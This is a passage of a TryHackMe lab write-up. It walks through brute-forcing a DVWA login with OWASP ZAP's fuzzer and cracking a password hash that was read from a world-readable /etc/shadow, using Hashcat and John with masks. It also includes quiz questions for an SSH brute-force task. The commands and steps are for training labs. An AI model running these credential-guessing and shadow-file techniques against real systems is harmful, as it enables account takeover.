Once it is running, click Manual Explore. In the URL to explore, type in 10.201.107.100 and then click Launch Browser (you have a choice between Firefox and Chrome, it doesn't really matter which you pick). This will take you to the main login page. Use the admin credentials we discovered in the previous task and login.<br>

From there, head to the DVWA Security page (xx.xxx.xxx.xxx/security.php) - Change the security to Low and click submit:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/96684b4e-8ff1-43d6-a388-da41c967c615"></p>

<p>The security level has been set to low (as you can see here)<br>

From there, head to the Brute Force section (<code>xx.xxx.xxx.xxx/vulnerabilities/brute/</code>). Your screen should now look like this:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/427e2df3-1062-420a-bc62-a4cfdeb019a0"></p>


<p>This is where we'll take on brute force round two. Let's try a test login using ZAP, as we did before with Burp Suite. Only this time, we have some valid credentials to use. Login using the username: admin and the password from the last task. You should get a message saying you logged into the admin area. Next, try a test login with some wrong credentials like test/testing:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/527eb3dc-42a1-45d4-bf22-2ec1010a76e6"></p>

<p>From within ZAP's History tab, we can compare our two login requests. (In our example, this is ID 96 and 100). One was valid (96), and the other wasn't (100) - Both got a 200 response code, but each one was different in size. So we can use that. We know there is a second set of login credentials - But this time we don't even know the username, never mind the password... Fear not though. ZAP can save the day!<br>

In our most recent login attempt in the request, double click on the username used (in this case test) and then right click and select Fuzz </p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/d22685e8-1f4d-4eb0-8fae-76264ac9af36"></p>

<p>This will then cause a popup to appear with the username highlighted. Click <strong>Payloads</strong> ... and this will open a second popup. Click <strong>Add</strong> ... . This will... You guessed it another, popup. Here select <strong>File</strong>  from the drop-down at the top and select the userlist.txt file that we provided:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/7019e97a-db20-4dc8-81f0-45eb3a1a556"></p>

<p>Click <strong>Add</strong> and then <strong>Ok</strong> (we'll work our way back to that original popup). Now in the Fuzzer box highlight the password we used and then click <strong>Add</strong> ...</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/9b99ba9b-8f80-4e22-867b-2b8812550f1d"></p>

<p>Go back through the various popups, but this time select the passwords.txt we used in the previous task. At the end, you should have two positions highlighted and two payloads. You Fuzzer box should look like this:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/ee792f07-3707-4d71-b3b4-a86f6a79eed0"></p>

<p>Don't worry if the colours are different. ZAP likes to be decorative, is all. Now click <strong>Start Fuzzer</strong>. This will create a new tab along the bottom which shows the Fuzzer in progress... You should see a load of 200 responses, all with the same Size Response (4,237 bytes). Click one at random as they whiz by and check out the response. Scroll down, and you'll see these are "<strong>Username and/or password incorrect</strong>. "messages. Click on the <strong>Size Resp. Body</strong> column and organise the results so that the largest response size is at the top. After a few minutes, you should find that you get a different response size... Like this:</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/b115b628-d751-4c4f-9dc7-488cb786c37f"></p>

<p>It looks like we might have a winner here... Pause the Fuzzer (or leave it running... But there probably isn't much need now. It'll just be generating needless traffic) and check out the response to our standout fuzzed request. It should say "<strong>Welcome to the password protected area <username></strong>" instead of the previous incorrect message. You can either look at the <strong>Request</strong> tab, or further examine the <strong>Payload</strong> column to see the password that was used with this username.<br>

We did it! We got the username and password from scratch (sort of). Now, if you want to, you can play around with the different security settings. Try Burp Suite again (though maybe with a smaller, curated list of passwords and usernames if you're on the free version). You can even try your hand at using the CLI tools. Though keep in mind people have reported issues using Hydra shipped with Kali against DVWA brute force before. So you'll need to make sure you've got a working version (not 9.1).</p>

<p><em>Answer the questions below</em></p>

<p>6.1. What is the username you found? Hint: <em>Check the ZAP Fuzzer Payload</em><br>
<code>____</code></p>


<p>

- xx.xxx.xx.xx/security.php<br>
- select Low<br>
- Submit</p>

<img width="1039" height="674" alt="image" src="https://github.com/user-attachments/assets/cfae406b-c40b-48d5-b0ee-f55db98ec579" />

<br>
<br>

<p>

- click Brute Force --> xx.xxx.xx.xx/vulnerabilities/brute/</p>


<p>

- Launch OWASP ZAP</p>

<img width="1034" height="485" alt="image" src="https://github.com/user-attachments/assets/574f2b01-c1d4-4ee4-b764-ae088302f175" />

<img width="812" height="326" alt="image" src="https://github.com/user-attachments/assets/6852d635-64ad-40a7-87b6-2b8c408dfe19" />

<img width="1068" height="290" alt="image" src="https://github.com/user-attachments/assets/cc01a878-ad47-4989-afd8-bb417a763286" />





<h6 align="center"><img width="300px" src="https://github.com/user-attachments/assets/14419050-1857-4d9e-9a54-4c09c684ce93"><br><br>
                   <img width="300px" src=""><br><br>
                   <img width="1200px" src=""><br><br>
                   <img width="1200px" src=""></h6>


<img width="333" height="343" alt="image" src="https://github.com/user-attachments/assets/757af97f-7621-43c0-9924-79e71d495541" />


<br>

<p>6.2. What is their password? Hint: <em>Check the ZAP Fuzzer Payload</em><br>
<code>____</code></p>



<br>
<h2>Task 7 . Brute forcing - SSH (Hydra + Patator)</h2>


<p><em>Answer the questions below</em></p>

<p>7.1. What is the SSH username?<br>
<code>____</code></p>

<br>

<p>7.2. What is their password (the encoded version) ?<br>
<code>____</code></p>

<br>

<p>7.3. What kind of encoding is this? <br>
<code>____</code></p>



<br>
<h2>Task 8 . Brute forcing - Hashes</h2>
<p>Hash cracking? But I thought this was a brute force lab?<br>

Well, it is - Hash cracking is really a form of brute forcing. This isn't a hash cracking / algorithm room, but the basics you need to know:<br>

- Hash functions are one-way functions. This means they are easy to compute and should be hard to reverse ( we won't go into things like SHAttered here, but it is worth looking at if you're interested)<br>
- The same input will create the same output (we'll cover the use of salts further down the line)<br><br>

So as we cannot reverse the hash function, to crack a password hash, if we know what the algorithm used was, we can create a list of hashes using common or known passwords (a wordlist, for example). We can then compare our created hash to the hash we are trying to "crack". If you've got a match, you know the password. <br>

So you see, when you're cracking a hash really, you're engaging in a brute force attack by simply testing your luck creating hashes until you find a match. Not only that but brute force is a type of hash cracking - Brute force-ception. The most common use case for hash cracking is that you provide a wordlist (like the ever popular rockyou) and let the cracker cycle through until it finds a match for the hash. But if you don't have a wordlist, or you've tried that already and got nowhere, you can double down on the brute force and have the cracker create it's own passwords on the fly to hash. This is what we'll be looking at in this task.<br>

Now, of course, these aren't the only hash cracking methods. Lookup tables with all the pre-cracked hashes (like crackstation) and rainbow tables are other hash cracking methods but also outside the scope of this room. So back to the room and task at hand - lets begin!<br>

We have now got full SSH access to our VM now as our username and encoded password from Task 7, so we can log in via SSH and look around and see if there is anything interesting. One of the first things we might want is to see what our current user can and can't do. In this instance, let's try running a sudo command as our user:<br><br>
<code>sudo cat /etc/shadow</code><br><br>

The shadow file is a great place to start (especially if we're after some hashes to crack) - But no such luck... Let's check the shadow files permissions though. Maybe there is more than one way to cat a file.<br>

If we check the permissions using the command <code>ls -l /etc/shadow</code>, it looks like anyone can read the shadow file... Their mistake is our gain. Plus, it looks like if we read through the file there is another user on the system. Copy out the whole line starting with the username and add it to a file on your Kali or AttackBox machine. In this case, I've created the file hash.txt. The username is intentionally blanked out in the screenshot so that you can work out the correct user.</p>

<p align="center"><img width="800px" src="https://github.com/user-attachments/assets/14072f58-1cca-4912-a249-c7f0b4a1b9c8"></p>

<p>Now there are two tools that (I at least think) are synonymous with hash cracking - John the ripper and Hashcat. There are pros and cons to both, and we won't get bogged down here going into that in detail. Safe to say, either one is going to be fine for our purpose here. Let's start with Hashcat.<br>

If we want to use Hashcat the first thing we'll need to do is work out the hash type we've got. Some of the Linux ninjas out there might not need to even bother with that. But it's handy to know how to. So let's start there. If we look at the Hashcat wiki there is a link, for Example hashes. If we go to that page, we can see that it lists the hash mode, hash name and shows us an example. Your first challenge, working out the hash type we're dealing with here and subsequent mode.<br>

Once we have the mode, we can build our Hashcat command.  If we look at the Hashcat help command (<code>hashcat -h</code>) at the end, it will show some basic examples. We can use those to build our command. Now a commonly seen use for Hashcat is to use a wordlist, like<br><br>
<code>hashcat -a 0 -m <mode> hash.txt <wordlist></code><br><br>
But in this case, we don't know if our password is in a wordlist, and use cases like that are covered very widely. So instead we're going to use the hashcat brute force attack.<br><br>
<code>hashcat -a 3 -m <mode> hash.txt <mask></code><br><br>
Now the mask is essentially how we tell Hashcat the key space to brute force. It requires that we know a few details about the password we're cracking in advance, like how many characters and what those characters are (ideally). The more information we have, the more we can make sure our mask is accurate and reduce the key space, making our brute force hash crack attempt quicker. Using this information we can use the hashcat built in charsets to create a mask to match our password and crack it. For example, using the charsets provided by hashcat if we wanted to brute force a 5 character password that is made up of all digit characters, except the middle one, which is an upper case character our mask would be:<br><br>
<code>?d?d?u?d?d</code><br><br>
Making our whole command (if this was say an SHA1 hash):<br><br>
<code>hashcat -a 3 -m 100 hash.txt ?d?d?u?d?d</code><br><br>
This will then cycle through creating passwords that match this mask, for example 11A11, 21A11, 31A11, etc. Hashing them (using the provided hash type, in this case SHA1), and then testing them to see if they match the provided hash. So if our hashed password was 12E45, eventually this would happen:</p>

```bash
11A11-> Hashed = 1F4A4922FFFDB189E4D3D479C1376C69CC24026A - Incorrect!

11A12 -> Hashed = 6DCD18DD86B0B6350BF82EEF98A1256B0AEC7026 - Incorrect!
...

...

...

11E45 -> Hashed = 3B88EF20F8305D09681CB6CF0F9EAC9963B8947E - Incorrect!

12E45 -> Hashed = BBB1BD3B59508DBC913D758ECF492F3327F7B634 - Correct!
```

<p>The way the keyspace is searched will depend on the number of characters provided and is detailed in the provided link above. This is simply to illustrates how the process will work, when using the mask brute force attack.<br>

In our case, we can tell you that the password is 5 characters long and is made up of all lower case characters, except the middle one, which is a digit. If you're wondering how do we know that, we used a tried and tested method to work it out, best illustrated here. Armed with this information, we can create our mask. Check the page linked above to see how to format your mask to check for two lowercase characters, a digit, followed by two more lower case characters.<br>

Now we have all the puzzle pieces, it's time to get cracking - Brute force style! This might take a bit of time, but it will work I promise. If you get beyond 10%  progress (you can view this by entering  <code>s</code> during your Hashcat crack to view the status), something has gone wrong. Make sure you copied the correct line and use the right mode, mask, etc.<br>

Once the password has been cracked, Hashcat will display to the screen the hash that was found, followed by a colon and then the password. Alternatively, Hashcat remembers the found passwords, and you can run the following command to display the cracked hashes:<br><br>
<code>hashcat -m <mode> --show hash.txt</code><br><br>
Using the same mask as we did with Hashcat (to view the mask options refer to the relevant docs), John will crack the hash just like Hashcat. Due to the way it explores the search-space, it may need to get up to 50% progress to find the password. Likewise, you can pass John the --show option to display cracked passwords again once the password has been found.</p>

<h3>BONUS:</h3>
<p>In the new users home directory is a folder that contains a python script and a .txt file. If you want to play around some more with the use of masks and hashcracking feel free to use the contents of these files.<br>

If you read the python script, you'll see that this makes use of a hash and salt - Remember what we said before about how the same input creates the same output? Well, one way people have worked around this issue is the use of a salt. A salt is a value which is not part of the initial value / password but which can be appended or prepended during the hash process so that the same password creates a different hash.<br>

Be warned if you want to try and brute force this hash using a mask attack, it will take a long time, so we didn't include it here. But it might give you an idea of how long trying to brute force a hash would be in a real user situation.  You can also use a wordlist attack for this one (the provided passwords file will work fine as a wordlist here). Just make sure you've got the right mode (refer to the Example hashes).<br>

One final note - If you look at the page for example hashes you'll notice there are a lot of them. The different algorithms being used can again be made different depending on the use of salts and even where the salt sits (before or after the password). You can get an idea of that just looking through the page. There is clearly a lot to the subject, which is beyond the scope of this room, but if you want to learn more a good place to start might be Hashing vs Encryption vs Encoding as well as How hashing works. </p>

<p><em>Answer the questions below</em></p>

<p>8.1. Which user can we crack the password for? Hint: <em>read the shadow file</em><br>
<code>____</code></p>

<br>

<p>8.2. What mode do we need for the user's hash? Hint: <em>Check the example page and run a Find for the first 3 chars of the hash</em><br>
<code>____</code></p>

<br>

<p>8.3. What is the cracked password?<br>
<code>____</code></p>

<br>

<p>8.4. What is the mask value we need to use? Hint: <em>Check the hashcat built in charsets</em><br>
<code>____</code></p>



<br>
<h2>Task 9 . Conclusion</h2>
<p>That's it. You've reached the end, and if you've managed all of the above, you can now call yourself a brute force hero and in your utility belt a few more tools.<br>

Most importantly, you hopefully know not only how to use these tools, but what tools can be used when and why they should (or shouldn't) be used. Knowing what command to run or how to run it is great. But if you know why, that is the most important thing because you'll find yourself getting stuck a lot less.<br>

So thank you for completing the room. The material covered within this room was in part taken (with permission) from a Cyber Security masters course.</p>

<p align="center">This room was created by myself (kafaka157) and Heisenberg.</p>

<p><em>Answer the question below</em></p>

<p>9.1. Read the above<br>
<code>No answerr needed</code></p>

<br>
<br>

<h1 align="center">Completed</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/ec3adeed-c4ee-43f0-bee9-5d6f78c5a43"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/ccf7439e-5dbd-4f44-9ee3-9297839a9bac"></p>

<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 1    | 452      |     141ˢᵗ    |      5ᵗʰ     |   3,338ᵗʰ   |    43ʳᵈ    | 118,424  |    887    |    73     |



</div>

<p align="center">Global All Time:   141ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/b8c1746f-be18-4435-96f3-347d4bf43ed9"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/e34c9e2a-8f75-4c9a-9b99-971e217c1960"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/6bdcc963-23e1-485d-b40e-e4c089fd1dd3"><br>
                  Global monthly:   3,338ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/327d6d05-8c11-43eb-8e2a-4e07c23d5ae5"><br>
                  Brazil monthly:      43ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/206fe1c3-6e3d-4a67-92e9-7b65cbb00ae7"><br>

<br>
<h1 align="center">Thanks for Coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 
